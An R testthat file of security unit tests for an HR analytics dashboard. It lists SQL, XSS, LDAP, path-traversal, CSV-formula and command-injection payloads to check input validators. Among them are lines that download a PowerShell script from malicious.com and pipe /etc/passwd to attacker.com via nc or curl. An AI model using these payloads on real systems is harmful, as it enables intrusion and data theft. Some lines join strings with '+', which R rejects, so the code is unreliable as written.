# ============================================================================
# ATLAS LABS HR ANALYTICS DASHBOARD - SECURITY EDGE CASE UNIT TESTS
# ============================================================================
# Focus: Input Validation & Sanitization Security Testing
# Coverage: SQL Injection, XSS, CSV Injection, File Upload, Path Traversal, etc.
# Author: akhapwoyaco
# ============================================================================

library(testthat)
library(shiny)
library(DBI)
library(RSQLite)
library(stringr)
library(tools)

# ============================================================================
# 2.1 SQL INJECTION PREVENTION TESTS
# ============================================================================

test_that("SQL Injection Edge Cases - Classic Attacks", {
  # Test classic SQL injection payloads
  malicious_inputs <- list(
    "' OR '1'='1",
    "'; DROP TABLE employees; --",
    "' UNION SELECT * FROM users --",
    "1' OR '1'='1' /*",
    "admin'--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' OR EXISTS(SELECT * FROM employees) --"
  )
  
  for (payload in malicious_inputs) {
    # Test employee ID validation
    expect_error(
      validate_employee_id(payload),
      regexp = "Invalid employee ID format|Security violation detected",
      info = paste("Failed to catch SQL injection:", payload)
    )
    
    # Test department filter validation
    expect_error(
      validate_department_filter(payload),
      regexp = "Invalid department|Suspicious input detected",
      info = paste("Failed to catch SQL injection in department:", payload)
    )
  }
})

test_that("SQL Injection Edge Cases - Advanced Techniques", {
  # Advanced SQL injection techniques
  advanced_payloads <- list(
    # Time-based blind injection
    "'; WAITFOR DELAY '00:00:05' --",
    "' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
    
    # Boolean-based blind injection
    "' AND SUBSTRING((SELECT @@version),1,1)='M' --",
    "' AND (SELECT LEN(name) FROM master..sysdatabases WHERE name='master')>0 --",
    
    # Error-based injection
    "' AND CONVERT(int,(SELECT @@version)) --",
    "' AND 1=CAST((SELECT @@version) AS int) --",
    
    # Second-order injection
    "test'; UPDATE employees SET salary=99999 WHERE name='admin'; --",
    
    # NoSQL injection attempts
    "' || '1'=='1",
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    
    # Encoded payloads
    "%27%20OR%20%271%27%3D%271",
    "0x27204F522027312027203D202731"
  )
  
  for (payload in advanced_payloads) {
    expect_error(
      sanitize_query_input(payload),
      regexp = "Security violation|Invalid input|Suspicious pattern",
      info = paste("Failed to catch advanced SQL injection:", payload)
    )
  }
})

test_that("SQL Injection Edge Cases - Parameterized Query Validation", {
  # Test that parameterized queries are enforced
  expect_true(validate_parameterized_query("SELECT * FROM employees WHERE id = ?"))
  expect_false(validate_parameterized_query("SELECT * FROM employees WHERE id = '" + user_input + "'"))
  expect_false(validate_parameterized_query(paste0("SELECT * FROM employees WHERE name = '", "test", "'")))
})

# ============================================================================
# 2.2 XSS ATTACK PREVENTION TESTS
# ============================================================================

test_that("XSS Attack Edge Cases - Script Injection", {
  xss_payloads <- list(
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script src='http://malicious.com/xss.js'></script>",
    "<script>document.cookie='stolen'</script>",
    
    # Event handlers
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "<div onclick='alert(\"XSS\")'>Click me</div>",
    "<input type='text' onfocus='alert(\"XSS\")'>",
    
    # JavaScript pseudo-protocol
    "javascript:alert('XSS')",
    "javascript:void(0);alert('XSS')",
    
    # Data URI XSS
    "data:text/html,<script>alert('XSS')</script>",
    
    # CSS-based XSS
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<div style='background:url(javascript:alert(\"XSS\"))'></div>",
    
    # HTML5 vectors
    "<video><source onerror='alert(\"XSS\")'>",
    "<audio src='x' onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'></svg>"
  )
  
  for (payload in xss_payloads) {
    # Test HTML sanitization
    sanitized <- sanitize_html_input(payload)
    expect_false(
      grepl("<script|javascript:|onerror|onload|onclick", sanitized, ignore.case = TRUE),
      info = paste("Failed to sanitize XSS payload:", payload)
    )
    
    # Test employee name input
    expect_error(
      validate_employee_name(payload),
      regexp = "Invalid characters|Security violation",
      info = paste("Failed to catch XSS in employee name:", payload)
    )
  }
})

test_that("XSS Attack Edge Cases - Encoded Payloads", {
  encoded_xss <- list(
    # URL encoded
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
    
    # HTML entity encoded
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    
    # Hex encoded
    "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
    
    # Unicode encoded
    "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
    
    # Mixed encoding
    "%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E"
  )
  
  for (payload in encoded_xss) {
    decoded_and_sanitized <- sanitize_html_input(url_decode(payload))
    expect_false(
      grepl("<script|alert|onerror", decoded_and_sanitized, ignore.case = TRUE),
      info = paste("Failed to handle encoded XSS:", payload)
    )
  }
})

# ============================================================================
# 2.3 CSV INJECTION TESTING
# ============================================================================

test_that("CSV Injection Edge Cases - Formula Injection", {
  csv_injection_payloads <- list(
    # Excel formula injection
    "=cmd|' /C calc'!A0",
    "=HYPERLINK(\"http://malicious.com\",\"Click here\")",
    "=SUM(1+1)*cmd|' /C calc'!A0",
    
    # LibreOffice/OpenOffice
    "=WEBSERVICE(\"http://attacker.com/steal?data=\"&A1)",
    "=IMPORTXML(\"http://malicious.com/xml\",\"//data\")",
    
    # Google Sheets
    "=GOOGLETRANSLATE(\"hello\",\"en\",\"es\")&WEBSERVICE(\"http://evil.com\")",
    
    # Command execution attempts
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
    
    # PowerShell injection
    "=cmd|'/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://malicious.com/evil.ps1'))'!A0",
    
    # Data exfiltration
    "=CONCATENATE(\"http://evil.com/?data=\",A1,A2,A3)"
  )
  
  for (payload in csv_injection_payloads) {
    # Test CSV export sanitization
    sanitized <- sanitize_csv_cell(payload)
    expect_false(
      grepl("^[=+@-]", sanitized),
      info = paste("Failed to sanitize CSV injection:", payload)
    )
    
    # Test employee data export
    expect_true(
      is_safe_for_csv_export(sanitized),
      info = paste("CSV sanitization failed for:", payload)
    )
  }
})

test_that("CSV Injection Edge Cases - Field Separator Manipulation", {
  # Test various CSV field separators and line breaks
  separator_attacks <- list(
    "test,=cmd|calc,end",
    "test\t=HYPERLINK(\"http://evil.com\")\tend",
    "test;+cmd|calc;end",
    "value1\n=SUM(1+1)\nvalue2",
    "test\r=WEBSERVICE(\"http://attacker.com\")\rend",
    "\"test\",\"=cmd|calc\",\"end\""
  )
  
  for (attack in separator_attacks) {
    sanitized <- sanitize_csv_content(attack)
    expect_false(
      any(grepl("^[=+@-]", unlist(strsplit(sanitized, "[,;\t\n\r]")))),
      info = paste("Failed to handle CSV separator attack:", attack)
    )
  }
})

# ============================================================================
# 2.4 FILE UPLOAD VALIDATION TESTS
# ============================================================================

test_that("File Upload Edge Cases - Malicious File Types", {
  malicious_files <- list(
    # Executable files with CSV extension
    list(name = "malware.csv.exe", content = "MZ\x90\x00\x03", mime = "application/x-msdownload"),
    list(name = "virus.csv.bat", content = "@echo off\ndel *.*", mime = "application/x-bat"),
    
    # Script files disguised as CSV
    list(name = "script.csv", content = "#!/bin/bash\nrm -rf /", mime = "text/x-shellscript"),
    list(name = "powershell.csv", content = "powershell.exe -ExecutionPolicy Bypass", mime = "text/plain"),
    
    # Zip bombs
    list(name = "bomb.csv", content = create_zip_bomb_content(), mime = "application/zip"),
    
    # Binary files with CSV extension
    list(name = "binary.csv", content = raw(c(0xFF, 0xFE, 0x00, 0x00)), mime = "application/octet-stream"),
    
    # HTML files with CSV extension
    list(name = "html.csv", content = "<html><script>alert('XSS')</script></html>", mime = "text/html"),
    
    # Files with null bytes
    list(name = "null.csv", content = "normal,data\x00malicious", mime = "text/csv"),
    
    # Extremely large files
    list(name = "huge.csv", content = paste(rep("a", 10^7), collapse = ""), mime = "text/csv"),
    
    # Files with dangerous macros
    list(name = "macro.csv", content = "=cmd|'/c start calc'!A1", mime = "text/csv")
  )
  
  for (file_info in malicious_files) {
    expect_error(
      validate_uploaded_file(file_info$name, file_info$content, file_info$mime),
      regexp = "Invalid file|Security violation|File type not allowed",
      info = paste("Failed to reject malicious file:", file_info$name)
    )
  }
})

test_that("File Upload Edge Cases - Filename Manipulation", {
  dangerous_filenames <- list(
    # Path traversal in filename
    "../../../etc/passwd.csv",
    "..\\..\\windows\\system32\\config\\sam.csv",
    "....//....//etc//passwd.csv",
    
    # Null byte injection
    "normal.csv\x00.exe",
    "data.csv\x00malicious.bat",
    
    # Unicode normalization attacks
    "test\u202E.csv\u202Dexe.txt",  # Right-to-left override
    
    # Long filenames
    paste0(paste(rep("a", 255), collapse = ""), ".csv"),
    
    # Special characters
    "file|with|pipes.csv",
    "file<with>brackets.csv",
    "file\"with\"quotes.csv",
    "file:with:colons.csv",
    
    # Reserved names (Windows)
    "CON.csv",
    "PRN.csv",
    "AUX.csv",
    "NUL.csv",
    "COM1.csv",
    "LPT1.csv",
    
    # Hidden files
    ".htaccess.csv",
    ".env.csv",
    
    # Multiple extensions
    "data.csv.exe.txt",
    "report.pdf.csv.bat"
  )
  
  for (filename in dangerous_filenames) {
    expect_error(
      validate_filename(filename),
      regexp = "Invalid filename|Security violation|Filename not allowed",
      info = paste("Failed to reject dangerous filename:", filename)
    )
  }
})

# ============================================================================
# 2.5 INPUT LENGTH RESTRICTIONS TESTS
# ============================================================================

test_that("Input Length Edge Cases - Buffer Overflow Attempts", {
  # Test various input fields for length restrictions
  
  # Extremely long employee names
  long_name <- paste(rep("A", 10000), collapse = "")
  expect_error(
    validate_employee_name(long_name),
    regexp = "Name too long|Length limit exceeded",
    info = "Failed to restrict employee name length"
  )
  
  # Extremely long department names
  long_dept <- paste(rep("Department", 1000), collapse = " ")
  expect_error(
    validate_department_name(long_dept),
    regexp = "Department name too long|Length limit exceeded",
    info = "Failed to restrict department name length"
  )
  
  # Long search queries
  long_query <- paste(rep("search term", 500), collapse = " ")
  expect_error(
    validate_search_query(long_query),
    regexp = "Query too long|Search term limit exceeded",
    info = "Failed to restrict search query length"
  )
  
  # Long filter values
  long_filter <- paste(rep("filter_value", 200), collapse = ",")
  expect_error(
    validate_filter_input(long_filter),
    regexp = "Filter value too long|Input length exceeded",
    info = "Failed to restrict filter input length"
  )
  
  # Test memory exhaustion attempts
  memory_bomb <- paste(rep("x", 2^20), collapse = "")  # 1MB string
  expect_error(
    process_user_input(memory_bomb),
    regexp = "Input too large|Memory limit exceeded",
    info = "Failed to prevent memory exhaustion"
  )
})

test_that("Input Length Edge Cases - Exact Boundary Testing", {
  # Test exact boundary conditions
  max_name_length <- 100
  max_dept_length <- 50
  max_query_length <- 200
  
  # Test exactly at limit
  expect_true(validate_employee_name(paste(rep("A", max_name_length), collapse = "")))
  expect_error(validate_employee_name(paste(rep("A", max_name_length + 1), collapse = "")))
  
  # Test exactly at limit for department
  expect_true(validate_department_name(paste(rep("D", max_dept_length), collapse = "")))
  expect_error(validate_department_name(paste(rep("D", max_dept_length + 1), collapse = "")))
  
  # Test exactly at limit for search query
  expect_true(validate_search_query(paste(rep("s", max_query_length), collapse = "")))
  expect_error(validate_search_query(paste(rep("s", max_query_length + 1), collapse = "")))
})

# ============================================================================
# 2.6 SPECIAL CHARACTER HANDLING TESTS
# ============================================================================

test_that("Special Character Edge Cases - Control Characters", {
  control_chars <- list(
    # ASCII control characters
    "\x00",  # Null
    "\x01",  # Start of Heading
    "\x07",  # Bell
    "\x08",  # Backspace
    "\x09",  # Tab
    "\x0A",  # Line Feed
    "\x0D",  # Carriage Return
    "\x1B",  # Escape
    "\x7F",  # Delete
    
    # Extended control characters
    "\x80", "\x81", "\x82", "\x83", "\x84",
    "\x85", "\x86", "\x87", "\x88", "\x89",
    
    # Mixed with normal text
    "John\x00Doe",
    "Department\x07Name",
    "Search\x1BQuery"
  )
  
  for (char in control_chars) {
    sanitized <- sanitize_input(char)
    expect_false(
      any(utf8ToInt(sanitized) < 32 & utf8ToInt(sanitized) != 9 & utf8ToInt(sanitized) != 10 & utf8ToInt(sanitized) != 13),
      info = paste("Failed to sanitize control character:", as.hexmode(utf8ToInt(char)))
    )
  }
})

test_that("Special Character Edge Cases - Unicode Exploitation", {
  unicode_attacks <- list(
    # Zero-width characters
    "Admin\u200B\u200C\u200D\uFEFFUser",  # Zero-width spaces
    
    # Bidirectional text attacks
    "user\u202Egnissecorp\u202D@evil.com",
    
    # Homograph attacks
    "аdmin",  # Cyrillic 'а' instead of Latin 'a'
    "gооgle.com",  # Cyrillic 'о' instead of Latin 'o'
    
    # Combining characters
    "e\u0301\u0300\u0302",  # e with multiple accents
    
    # Normalization attacks
    "café",  # é as single character
    "cafe\u0301",  # é as e + combining acute
    
    # Invisible characters
    "test\u2060invisible\u2061text",  # Word joiner characters
    
    # Format characters
    "malicious\u00ADtext",  # Soft hyphen
    "hidden\u034Ftext"      # Combining grapheme joiner
  )
  
  for (unicode_text in unicode_attacks) {
    normalized <- normalize_unicode_input(unicode_text)
    expect_true(
      is_safe_unicode(normalized),
      info = paste("Failed to handle Unicode attack:", unicode_text)
    )
  }
})

# ============================================================================
# 2.7 PATH TRAVERSAL PROTECTION TESTS
# ============================================================================

test_that("Path Traversal Edge Cases - Directory Traversal", {
  path_traversal_attempts <- list(
    # Basic directory traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    
    # URL encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",
    
    # Double URL encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # Unicode encoded
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    
    # Mixed separators
    "..\\../\\..\\../etc/passwd",
    "..//..\\\\..//etc\\passwd",
    
    # Null byte injection
    "../../../etc/passwd%00.csv",
    "..\\..\\..\\windows\\system32\\config\\sam%00.txt",
    
    # Long path attempts
    paste(rep("../", 100), collapse = "") + "etc/passwd",
    
    # Absolute paths
    "/etc/passwd",
    "\\windows\\system32\\config\\sam",
    "C:\\windows\\system32\\config\\sam",
    
    # UNC paths
    "\\\\server\\share\\file",
    "//server/share/file",
    
    # Environment variable injection
    "%SYSTEMROOT%\\system32\\config\\sam",
    "$HOME/.ssh/id_rsa"
  )
  
  for (path in path_traversal_attempts) {
    expect_error(
      validate_file_path(path),
      regexp = "Invalid path|Path traversal|Security violation",
      info = paste("Failed to prevent path traversal:", path)
    )
    
    # Test in file operations
    expect_error(
      safe_file_read(path),
      regexp = "Invalid file path|Access denied",
      info = paste("Failed to prevent file access:", path)
    )
  }
})

test_that("Path Traversal Edge Cases - Whitelist Validation", {
  # Test that only allowed paths work
  allowed_paths <- c(
    "data/employee.csv",
    "data/performance_rating.csv",
    "data/education_level.csv",
    "reports/generated_report.pdf"
  )
  
  for (path in allowed_paths) {
    expect_true(
      is_allowed_file_path(path),
      info = paste("Incorrectly rejected allowed path:", path)
    )
  }
  
  # Test that variations of allowed paths are rejected
  path_variations <- c(
    "data/../data/employee.csv",
    "./data/employee.csv",
    "data//employee.csv",
    "data\\employee.csv"
  )
  
  for (path in path_variations) {
    expect_false(
      is_allowed_file_path(path),
      info = paste("Incorrectly allowed path variation:", path)
    )
  }
})

# ============================================================================
# 2.8 COMMAND INJECTION PREVENTION TESTS
# ============================================================================

test_that("Command Injection Edge Cases - Shell Command Injection", {
  command_injection_payloads <- list(
    # Basic command injection
    "; ls -la",
    "| cat /etc/passwd",
    "& dir",
    "&& whoami",
    "|| id",
    
    # Command substitution
    "`ls -la`",
    "$(whoami)",
    "${USER}",
    
    # Redirection attacks
    "> /tmp/hacked",
    "< /etc/passwd",
    "2>&1 cat /etc/passwd",
    
    # Background execution
    "& sleep 10 &",
    "& nc -l 4444 &",
    
    # Pipe attacks
    "| nc attacker.com 4444 < /etc/passwd",
    "| curl http://evil.com -d @/etc/passwd",
    
    # Multi-command
    "; rm -rf / ; echo 'hacked'",
    "& del /f /q C:\\*.*",
    
    # Encoded commands
    "%3Bls%20-la",
    "%26%26whoami",
    
    # PowerShell injection
    "; powershell.exe -enc <base64>",
    "& powershell -c \"Get-Process\"",
    
    # SQL command injection
    "; xp_cmdshell 'dir'",
    "'; EXEC master..xp_cmdshell 'net user hacker password /add'--"
  )
  
  for (payload in command_injection_payloads) {
    # Test system command validation
    expect_error(
      validate_system_input(payload),
      regexp = "Invalid input|Command injection|Security violation",
      info = paste("Failed to prevent command injection:", payload)
    )
    
    # Test report generation parameters
    expect_error(
      validate_report_params(list(title = payload)),
      regexp = "Invalid parameter|Security violation",
      info = paste("Failed to prevent command injection in report params:", payload)
    )
  }
})

test_that("Command Injection Edge Cases - Environment Variable Manipulation", {
  env_attacks <- list(
    # Environment variable injection
    "$PATH",
    "${HOME}",
    "%SYSTEMROOT%",
    "%PATH%",
    
    # Combined with commands
    "$HOME; ls -la",
    "${USER} && whoami",
    "%USERPROFILE% & dir",
    
    # Process substitution
    "<(cat /etc/passwd)",
    ">(cat > /tmp/hacked)",
    
    # Here documents
    "<< EOF\nmalicious content\nEOF"
  )
  
  for (attack in env_attacks) {
    sanitized <- sanitize_environment_input(attack)
    expect_false(
      grepl("[\\$%<>;&|`]", sanitized),
      info = paste("Failed to sanitize environment attack:", attack)
    )
  }
})

# ============================================================================
# 2.9 LDAP INJECTION TESTING
# ============================================================================

test_that("LDAP Injection Edge Cases - Filter Manipulation", {
  ldap_injection_payloads <- list(
    # Basic LDAP injection
    "*)(objectClass=*",
    "admin)(&(objectClass=user)(cn=*",
    "*))%00",
    
    # Boolean-based blind injection
    "*)|(objectClass=*",
    "*)(|(objectClass=user)(objectClass=computer",
    
    # Attribute enumeration
    "*)(mail=*",
    "*)(description=*",
    "*)(userPassword=*",
    
    # Wildcard attacks
    "*",
    "**",
    "*)*",
    
    # Special characters
    "test\\29\\28objectClass=*\\29",
    "test\\2A\\29\\28objectClass=user\\29",
    
    # Unicode attacks
    "test\\u0029\\u0028objectClass=*\\u0029",
    
    # Time-based attacks
    "*)(objectClass=user)(sleep(5",
    
    # Error-based injection
    "*)(objectClass=nonexistent)(objectClass=*"
  )
  
  for (payload in ldap_injection_payloads) {
    # Test LDAP query sanitization
    sanitized <- sanitize_ldap_input(payload)
    expect_false(
      grepl("[*()\\\\|&]", sanitized),
      info = paste("Failed to sanitize LDAP injection:", payload)
    )
    
    # Test authentication input
    expect_error(
      validate_auth_input(payload),
      regexp = "Invalid authentication|LDAP injection|Security violation",
      info = paste("Failed to prevent LDAP injection in auth:", payload)
    )
  }
})

test_that("LDAP Injection Edge Cases - DN Manipulation", {
  dn_attacks <- list(
    # DN injection
    "cn=admin,dc=test,dc=com\\00cn=hacker,dc=evil,dc=com",
    "cn=user+description=hacker,dc=test,dc=com",
    
    # Relative DN attacks
    ",cn=admin,dc=test,dc=com",
    "+description=admin,dc=test,dc=com",
    
    # Special DN characters
    "cn=test\\,admin,dc=test,dc=com",
    "cn=test\\+admin,dc=test,dc=com",
    "cn=test\\\"admin,dc=test,dc=com",
    "cn=test\\\\admin,dc=test,dc=com",
    "cn=test\\#admin,dc=test,dc=com"
  )
  
  for (dn in dn_attacks) {
    expect_error(
      validate_ldap_dn(dn),
      regexp = "Invalid DN|LDAP injection|Security violation",
      info = paste("Failed to prevent DN injection:", dn)
    )
  }
})

# ============================================================================
# HELPER FUNCTIONS FOR SECURITY TESTING
# ============================================================================

# Placeholder functions that would be implemented in the actual app
validate_employee_id <- function(id) {
  if (grepl("['\";\\\\]|OR\\s+|UNION\\s+|DROP\\s+|INSERT\\s+", id, ignore.case = TRUE)) {
    stop("Invalid employee ID format")
  }
  if (nchar(id) > 20) stop("Employee ID too long")
  return(TRUE)
}

validate_department_filter <- function(dept) {
  if (grepl("['\";\\\\]|OR\\s+|UNION\\s+", dept, ignore.case = TRUE)) {
    stop("Invalid department")
  }
  return(TRUE)
}

sanitize_query_input <- function(input) {
  if (grepl("(WAITFOR|SLEEP|BENCHMARK|pg_sleep)", input, ignore.case = TRUE)) {
    stop("Security violation detected")
  }
  if (grepl("(\\$ne|\\$gt|\\$lt)", input)) {
    stop("NoSQL injection detected")
  }
  return(gsub("['\";\\\\]", "", input))
}

validate_parameterized_query <- function(query) {
  return(!grepl("'\\s*\\+\\s*|\"\\s*\\+\\s*|CONCAT\\s*\\(", query, ignore.case = TRUE))
}

sanitize_html_input <- function(input) {
  # Remove dangerous HTML tags and attributes
  input <- gsub("<script[^>]*>.*?</script>", "", input, ignore.case = TRUE)
  input <- gsub("javascript:", "", input, ignore.case = TRUE)
  input <- gsub("on\\w+\\s*=", "", input, ignore.case = TRUE)
  return(input)
}

validate_employee_name <- function(name) {
  if (grepl("<|>|script|javascript", name, ignore.case = TRUE)) {
    stop("Invalid characters in name")
  }
  if (nchar(name) > 100) stop("Name too long")
  return(TRUE)
}

url_decode <- function(input) {
  return(URLdecode(input))
}

sanitize_csv_cell <- function(cell) {
  # Remove leading formula characters
  if (grepl("^[=+@-]", cell)) {
    cell <- paste0("'", cell)
  }
  return(cell)
}

is_safe_for_csv_export <- function(cell) {
  return(!